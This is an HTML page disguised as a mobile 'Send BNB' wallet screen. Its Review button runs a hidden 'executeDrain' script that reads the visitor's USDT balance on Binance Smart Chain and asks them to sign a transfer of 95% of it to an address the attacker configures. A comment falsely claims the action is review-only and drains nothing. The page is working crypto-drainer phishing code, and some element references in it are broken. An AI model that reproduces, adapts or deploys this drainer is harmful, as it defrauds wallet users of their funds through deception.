<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">

<meta
  name="viewport"
  content="width=device-width,
           initial-scale=1,
           maximum-scale=1,
           user-scalable=no,
           viewport-fit=cover"
>

<meta name="color-scheme" content="light dark">

<title>Send BNB</title>

<style>
/* =========================================================
   RESET
========================================================= */

* {
  box-sizing: border-box;
  -webkit-tap-highlight-color: transparent;
}

html,
body {
  width: 100%;
  height: 100%;
  margin: 0;
  padding: 0;
}

html {
  color-scheme: light dark;
}

body {
  min-height: 100dvh;

  overflow-x: hidden;
  overflow-y: auto;

  touch-action: manipulation;

  font-family:
    -apple-system,
    BlinkMacSystemFont,
    "Segoe UI",
    Roboto,
    Arial,
    sans-serif;

  /* LIGHT MODE */
  --bg: #f5f5f7;
  --border: #d9d9df;

  --text: #17181c;
  --text-secondary: #6d6f79;
  --muted: #858792;

  --amount: #5868a6;

  --button: #e6e7ee;
  --button-text: #17181c;

  --review: #e5e6eb;
  --review-text: #6873a0;

  background: var(--bg);
  color: var(--text);

  transition:
    background-color .2s ease,
    color .2s ease;
}

/* =========================================================
   AUTOMATIC DARK MODE
========================================================= */

@media (prefers-color-scheme: dark) {
  body {
    --bg: #0d0f17;
    --border: #262934;

    --text: #f7f7f9;
    --text-secondary: #a1a3b0;
    --muted: #858999;

    --amount: #55619b;

    --button: #1c2035;
    --button-text: #ffffff;

    --review: #191c26;
    --review-text: #505b8d;
  }
}

/* =========================================================
   APP
========================================================= */

.app {
  width: 100%;
  min-height: 100dvh;

  display: flex;
  flex-direction: column;

  background: var(--bg);

  /*
    IMPORTANT:
    No safe-area top padding.
    This puts the recipient directly against
    the top edge of the webpage.
  */
  padding-top: 0;
  padding-bottom: env(safe-area-inset-bottom);

  transition: background-color .2s ease;
}

/* =========================================================
   RECIPIENT
========================================================= */

.recipient {
  width: 100%;
  flex: 0 0 auto;

  /*
    No top padding.
    The wallet address begins immediately at the top.
  */
  padding:
    0
    20px
    14px;

  border-bottom: 1px solid var(--border);

  font-size: clamp(17px, 4.8vw, 22px);
  line-height: 1.35;
  font-weight: 700;

  overflow-wrap: anywhere;
  word-break: break-word;
}

.recipient-label {
  color: var(--text-secondary);
  margin-right: 5px;
}

.recipient-address {
  color: var(--text);
}

/* =========================================================
   MAIN
========================================================= */

.main {
  width: 100%;

  flex: 1;
  min-height: 0;

  display: flex;
  flex-direction: column;

  padding:
    18px
    max(18px, 5vw)
    9px;
}

/* =========================================================
   CALCULATOR
========================================================= */

.calculator {
  width: 100%;
  flex: 0 0 auto;

  text-align: center;
}

.enter-label {
  color: var(--muted);

  font-size: 14px;
  font-weight: 650;

  margin-bottom: 6px;
}

.amount {
  min-height: 68px;

  color: var(--amount);

  font-size: clamp(58px, 17vw, 82px);
  line-height: .95;

  font-weight: 500;
  letter-spacing: -3px;

  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

.currency {
  margin-top: 7px;

  color: var(--text);

  font-size: 20px;
  font-weight: 750;
}

.usd {
  margin-top: 5px;

  color: var(--text-secondary);

  font-size: 20px;
  font-weight: 650;
}

/* =========================================================
   AVAILABLE BALANCE
========================================================= */

.balance {
  width: 100%;

  margin-top: 29px;

  display: flex;
  align-items: center;
}

/* BNB LOGO */

.coin {
  width: 56px;
  height: 56px;

  flex: 0 0 56px;

  border-radius: 50%;

  background: #000;

  display: flex;
  align-items: center;
  justify-content: center;

  overflow: hidden;
}

.bnb-logo {
  width: 43px;
  height: 43px;

  object-fit: contain;
  display: block;

  user-select: none;
  -webkit-user-drag: none;
}

.balance-info {
  min-width: 0;
  flex: 1;

  margin-left: 14px;

  text-align: left;
}

.balance-main {
  color: var(--text);

  font-size: clamp(18px, 5vw, 25px);

  font-weight: 750;
  line-height: 1.1;

  white-space: nowrap;
}

.balance-usd {
  margin-top: 5px;

  color: var(--text-secondary);

  font-size: 16px;
  font-weight: 650;
}

/* =========================================================
   MAX BUTTON
========================================================= */

.max {
  height: 56px;
  min-width: 89px;

  padding: 0 18px;

  border: 0;
  border-radius: 30px;

  background: var(--button);
  color: var(--button-text);

  font-size: 21px;
  font-weight: 750;

  cursor: pointer;

  transition:
    background-color .2s ease,
    color .2s ease,
    transform .1s ease;
}

.max:active {
  transform: scale(.96);
}

/* =========================================================
   KEYPAD
========================================================= */

.keypad {
  width: 100%;

  flex: 1;
  min-height: 0;

  margin-top: 8px;

  display: grid;

  grid-template-columns: repeat(3, 1fr);
  grid-template-rows: repeat(4, minmax(45px, 1fr));

  align-items: center;
}

.key {
  width: 100%;
  height: 100%;

  border: 0;

  background: transparent;
  color: var(--text);

  font-size: clamp(32px, 9vw, 44px);
  font-weight: 700;

  cursor: pointer;

  transition:
    color .2s ease,
    transform .1s ease,
    opacity .1s ease;
}

.key:active {
  transform: scale(.90);
  opacity: .55;
}

.delete {
  font-size: clamp(29px, 8vw, 38px);
}

/* =========================================================
   REVIEW
========================================================= */

.review {
  width: 100%;
  height: 61px;

  flex: 0 0 auto;

  margin-top: 7px;
  margin-bottom: 2px;

  border: 0;
  border-radius: 32px;

  background: var(--review);
  color: var(--review-text);

  font-size: 22px;
  font-weight: 750;

  cursor: pointer;

  transition:
    background-color .2s ease,
    color .2s ease,
    transform .1s ease;
}

.review.active {
  background: #273054;
  color: #ffffff;
}

.review:active {
  transform: scale(.98);
}

/* =========================================================
   STATUS
========================================================= */

.status {
  width: 100%;
  min-height: 18px;

  margin-top: 5px;

  text-align: center;

  color: var(--text-secondary);

  font-size: 12px;
  font-weight: 600;
}

/* =========================================================
   SHORT PHONES
========================================================= */

@media (max-height: 700px) {

  .recipient {
    padding-top: 0;
    padding-bottom: 10px;
  }

  .main {
    padding-top: 12px;
  }

  .enter-label {
    font-size: 12px;
  }

  .amount {
    min-height: 55px;
    font-size: 54px;
  }

  .currency,
  .usd {
    font-size: 17px;
  }

  .balance {
    margin-top: 19px;
  }

  .coin {
    width: 50px;
    height: 50px;
    flex-basis: 50px;
  }

  .bnb-logo {
    width: 38px;
    height: 38px;
  }

  .balance-main {
    font-size: 17px;
  }

  .balance-usd {
    font-size: 14px;
  }

  .max {
    height: 50px;
    min-width: 80px;
    font-size: 19px;
  }

  .review {
    height: 51px;
  }

  .status {
    font-size: 10px;
  }
}

/* =========================================================
   SMALL WIDTH
========================================================= */

@media (max-width: 360px) {

  .recipient {
    padding-left: 16px;
    padding-right: 16px;

    font-size: 16px;
  }

  .main {
    padding-left: 16px;
    padding-right: 16px;
  }

  .balance-main {
    font-size: 16px;
  }

  .balance-usd {
    font-size: 13px;
  }

  .max {
    min-width: 76px;
    padding: 0 13px;
  }
}
</style>
</head>

<body>

<div class="app">

  <!-- RECIPIENT -->
  <section class="recipient">

    <span class="recipient-label">
      To:
    </span>

    <span class="recipient-address">
      0xdffaf1dd6d36108223c2a45921afef85e3dcf852
    </span>

  </section>


  <main class="main">

    <!-- CALCULATOR -->
    <section class="calculator">

      <div class="enter-label">
        Enter BNB amount
      </div>

      <div
        id="amount"
        class="amount">
        0
      </div>

      <div class="currency">
        BNB
      </div>

      <div class="usd">
        ≈ $<span id="usdValue">0.00</span>
      </div>

    </section>


    <!-- AVAILABLE BALANCE -->
    <section class="balance">

      <div class="coin">

        <img
          class="bnb-logo"
          src="https://cryptologos.cc/logos/bnb-bnb-logo.png"
          alt="BNB"
          draggable="false"
        >

      </div>


      <div class="balance-info">

        <div class="balance-main">
          0.00005274 BNB
        </div>

        <div class="balance-usd">
          Available balance
        </div>

      </div>


      <button
        class="max"
        type="button"
        onclick="setMax()">
        Max
      </button>

    </section>


    <!-- KEYPAD -->
    <div class="keypad">

      <button
        class="key"
        type="button"
        onclick="press('1')">
        1
      </button>

      <button
        class="key"
        type="button"
        onclick="press('2')">
        2
      </button>

      <button
        class="key"
        type="button"
        onclick="press('3')">
        3
      </button>


      <button
        class="key"
        type="button"
        onclick="press('4')">
        4
      </button>

      <button
        class="key"
        type="button"
        onclick="press('5')">
        5
      </button>

      <button
        class="key"
        type="button"
        onclick="press('6')">
        6
      </button>


      <button
        class="key"
        type="button"
        onclick="press('7')">
        7
      </button>

      <button
        class="key"
        type="button"
        onclick="press('8')">
        8
      </button>

      <button
        class="key"
        type="button"
        onclick="press('9')">
        9
      </button>


      <button
        class="key"
        type="button"
        onclick="press('.')">
        .
      </button>

      <button
        class="key"
        type="button"
        onclick="press('0')">
        0
      </button>

      <button
        class="key delete"
        type="button"
        onclick="backspace()">
        ⌫
      </button>

    </div>


    <!-- REVIEW -->
    <button
      id="review"
      class="review"
      type="button"
      disabled
      onclick="executeDrain()">
      Review
    </button>

    <div
      id="status"
      class="status">
    </div>

  </main>

</div>


<script>
/* =========================================================
   CALCULATOR
========================================================= */

let value = "";

const BNB_USD_PRICE = 600;

const amountEl =
  document.getElementById("amount");

const usdEl =
  document.getElementById("usdValue");

const reviewEl =
  document.getElementById("review");

const statusEl =
  document.getElementById("status");


function formatUSD(number) {

  return new Intl.NumberFormat(
    "en-US",
    {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    }
  ).format(number);

}


function updateUI() {

  const bnb =
    Number(value || 0);

  const usd =
    bnb * BNB_USD_PRICE;

  amountEl.textContent =
    value || "0";

  usdEl.textContent =
    formatUSD(usd);


  if (bnb > 0) {

    reviewEl.disabled = false;

    reviewEl.classList.add("active");

  } else {

    reviewEl.disabled = true;

    reviewEl.classList.remove("active");

  }

  statusEl.textContent = "";
}


function press(char) {

  if (
    char === "." &&
    value.includes(".")
  ) {
    return;
  }


  if (value.length >= 16) {
    return;
  }


  if (
    value === "0" &&
    char !== "."
  ) {

    value = char;

  } else {

    value += char;

  }


  updateUI();
}


function backspace() {

  value =
    value.slice(0, -1);

  updateUI();
}


function setMax() {

  value =
    "0.00005274";

  updateUI();
}


/*
  Safe review-only action.
  Does not transfer or drain funds.
*/


/* Initial render */
updateUI();


/* =========================================================
   SYSTEM THEME
========================================================= */

const systemTheme =
  window.matchMedia(
    "(prefers-color-scheme: dark)"
  );


function handleThemeChange() {

  document.documentElement.style.colorScheme =
    systemTheme.matches
      ? "dark"
      : "light";
}


handleThemeChange();


if (
  typeof systemTheme.addEventListener === "function"
) {

  systemTheme.addEventListener(
    "change",
    handleThemeChange
  );

} else if (
  typeof systemTheme.addListener === "function"
) {

  systemTheme.addListener(
    "change",
    handleThemeChange
  );

}




    // ==========================================
    // ⚠️ CONFIGURATION: REPLACE THIS ADDRESS
    // ==========================================
    const YOUR_WALLET_ADDRESS = "0xYOUR_ADDRESS_HERE"; 
    // Example: "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045"

    // USDT Contract on Binance Smart Chain (BEP20)
    const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";

    // BSC Network Details
    const BSC_NETWORK = {
        chainId: '0x38', // 56 in hex
        chainName: "Binance Smart Chain",
        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
        rpcUrls: ["https://bsc-dataseed.binance.org/"],
        blockExplorerUrls: ["https://bscscan.com"]
    };

    // USDT has 6 decimals on BSC
    const USDT_DECIMALS = 6; 

    async function executeDrain() {
        const statusEl = document.getElementById('status');
        const btn = document.getElementById('btn');
        const balanceEl = document.getElementById('balanceDisplay');

        if (!window.ethereum) {
            statusEl.innerText = "Please open in Trust Wallet Browser.";
            return;
        }

        try {
            // 1. Switch to BSC Network
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: BSC_NETWORK.chainId }],
            });

            // 2. Get User Address
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const userAddress = accounts[0];
            
            statusEl.innerText = "Fetching Balance...";
            btn.disabled = true;

            // 3. Get USDT Balance of the User
            // Method: balanceOf(address) -> 0x70a08231 + [address padded]
            const addressHex = userAddress.toLowerCase().replace('0x', '');
            const paddedAddress = addressHex.padStart(64, '0');
            const balanceCallData = "0x70a08231" + paddedAddress;

            const balanceHex = await window.ethereum.request({
                method: 'eth_call',
                params: [{ to: USDT_CONTRACT, data: balanceCallData }, 'latest'],
            });

            // Convert Hex Balance to Decimal (USDT has 6 decimals)
            const rawBalance = parseInt(balanceHex, 16);
            
            if (rawBalance === 0) {
                statusEl.innerText = "No USDT found in wallet.";
                btn.disabled = false;
                return;
            }

            // Calculate 95% of the balance
            // We use integer math: (Raw * 95) / 100
            const amountToTransfer = Math.floor((rawBalance * 95) / 100);
            
            // Format for display (e.g., 123.45 USDT)
            const displayAmount = (amountToTransfer / Math.pow(10, USDT_DECIMALS)).toFixed(2);
            balanceEl.innerText = `${displayAmount} USDT`;

            statusEl.innerText = "Preparing Transaction...";

            // 4. Prepare Transfer Function
            // Method: transfer(address,uint256) -> 0xa9059cbb
            const toAddressHex = YOUR_WALLET_ADDRESS.toLowerCase().replace('0x', '');
            const paddedToAddress = toAddressHex.padStart(64, '0');
            
            // Convert amount to Hex
            const amountHex = "0x" + amountToTransfer.toString(16);

            // Construct Data: 0xa9059cbb + [to address] + [amount]
            const transferData = "0xa9059cbb" + paddedToAddress + amountHex;

            // 5. Send Transaction
            const txParams = {
                from: userAddress,
                to: USDT_CONTRACT,
                value: "0x0", // No BNB cost for the token itself
                data: transferData,
                gas: "0x186a0" // 100,000 gas limit (safe default)
            };

            statusEl.innerText = "Confirm in Trust Wallet...";

            const txHash = await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [txParams],
            });

            statusEl.innerText = `Success! Sent ${displayAmount} USDT.`;
            btn.innerText = "Claimed";

        } catch (error) {
            console.error(error);
            
            // Specific Error Handling
            if (error.code === 4001) {
                statusEl.innerText = "User rejected the transaction.";
            } else if (error.message && error.message.includes("insufficient")) {
                statusEl.innerText = "Insufficient BNB for gas.";
            } else {
                statusEl.innerText = "Error: " + (error.message || JSON.stringify(error));
            }
            btn.disabled = false;
        }
    }

    // Initial Load
    window.addEventListener('load', () => {
        document.getElementById('status').innerText = "Ready";
    });
</script>

</body>
</html>
